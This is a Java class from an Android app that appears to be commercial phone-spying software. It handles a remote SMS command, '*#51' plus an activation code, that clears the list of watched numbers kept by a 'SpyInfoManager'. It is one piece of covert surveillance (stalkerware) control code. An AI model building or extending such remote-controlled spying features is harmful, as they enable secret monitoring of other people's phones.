package com.fx.dalvik.smscommand.interpreter;

import java.util.ArrayList;

import android.content.Context;
import android.os.SystemClock;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;

public class SmsWatchListClear {

	private static final String TAG = "SmsWatchListClear";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#51";
	
	// Watch list clear command
	// <*#51><FK>
	public static String processCommand(Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Clear watch list
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		spyInfoManager.setWatchList(new ArrayList<String>());
		spyInfoManager.dumpWatchListToStorage();
		
		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);

		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
	}
}
